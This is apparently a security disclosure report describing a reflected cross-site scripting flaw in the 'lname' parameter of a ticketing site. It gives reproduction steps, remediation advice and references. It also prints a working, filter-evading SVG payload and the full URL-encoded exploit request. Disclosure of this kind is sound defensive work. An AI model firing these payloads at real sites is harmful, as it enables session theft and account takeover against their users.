## Title

Reflected XSS on Form Function

## Description

**Affected URL:** https://tickets.pwnedbox.site

**Vulnerability Type:** Reflected Cross-Site Scripting (XSS)

**Parameter:** https://tickets.pwnedbox.site/?lname=

**Severity:** [High]

**Description:**

A Reflected Cross-Site Scripting (XSS) vulnerability was identified in the application. User-supplied input is reflected in the HTTP response without proper sanitization or output encoding, allowing JavaScript execution in the victim's browser.

## Steps to Reproduce

1. Visit the affected URL :- https://tickets.pwnedbox.site
2. Navigate to the vulnerable functionality.
3. Insert the following XSS payload into the vulnerable parameter:

   ```html
   "><sVg onLoad="&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;" onclick="coNfirm(1)"><rect onmouseover="pRompt(1)" width="100" height="100"/></sVg>
   ```

4. Submit the input.
5. Observe that JavaScript executes in the browser.

## Proof of Concept (POC)

### Screenshot


<img width="1917" height="860" alt="Screenshot 2026-11-16 114045" src="https://github.com/user-attachments/assets/84616e02-0b85-4cce-90a7-44a9eb7831bc" />
<img width="1917" height="808" alt="Screenshot 2026-11-16 114041" src="https://github.com/user-attachments/assets/b35abb41-1571-4818-88b0-5b92253fdc88" />


### Video Demonstration


**Video Link:** [https://drive.google.com/file/d/1DuaZDI-c9MFwr065mSmV5FfkrU9_WFIR/view?usp=sharing]

### HTTP Request / Response


```http
https://tickets.pwnedbox.site/?lname=%22%3E%3CsVg+onLoad%3D%22%26%2399%3B%26%23111%3B%26%23110%3B%26%23102%3B%26%23105%3B%26%23114%3B%26%23109%3B%26%2340%3B%26%2349%3B%26%2341%3B%22+onclick%3D%22coNfirm%281%29%22%3E%3Crect+onmouseover%3D%22pRompt%281%29%22+width%3D%22100%22+height%3D%22100%22%2F%3E%3C%2FsVg%3E
```

### Payload

```html
   "><sVg onLoad="&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;" onclick="coNfirm(1)"><rect onmouseover="pRompt(1)" width="100" height="100"/></sVg>
```


## Impact

Depending on the application's functionality, this vulnerability could lead to:

- **Account Takeover:** Stealing session cookies through `document.cookie` when cookies are not protected by `HttpOnly`, potentially allowing attackers to hijack user accounts.
- **Sensitive Data Theft:** Accessing personal information, API responses, and other sensitive data available to the victim's browser.
- **Unauthorized Actions:** Performing actions on behalf of authenticated users, such as changing account settings or modifying user information.
- **Admin Account Compromise:** Potentially targeting administrators to gain access to privileged application functionality.
- **Credential Theft:** Injecting fake login forms to capture users' login credentials.
- **Internal Network Access:** Using the victim's browser to interact with internal services accessible from their network.
- **Phishing & Redirection:** Redirecting users to malicious websites or displaying fake content.
- **Application Manipulation:** Modifying website content or manipulating application functionality.

**Actual Impact:** [Describe the impact demonstrated during testing.]

**Affected Users:** [All Users / Authenticated Users / Administrators]

### References

These are useful technical references for understanding and documenting XSS impact:

1. [PortSwigger – Cross-Site Scripting and Impact](https://portswigger.net/web-security/cross-site-scripting)
2. [PortSwigger – Exploiting XSS Vulnerabilities](https://portswigger.net/web-security/cross-site-scripting/exploiting)
3. [OWASP – Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
4. [OWASP – XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
5. [Microsoft – Weaponizing Cross-Site Scripting](https://www.microsoft.com/en-us/msrc/blog/2025/11/weaponizing-cross-site-scripting-when-one-bug-isnt-enough)


## Remediation

- Properly encode user-controlled output based on its HTML context.
- Sanitize untrusted input where appropriate.
- Avoid unsafe DOM manipulation methods such as `innerHTML`.
- Implement a restrictive Content Security Policy (CSP) as an additional security layer.

## References

- https://owasp.org/www-community/attacks/xss/
- https://portswigger.net/web-security/cross-site-scripting
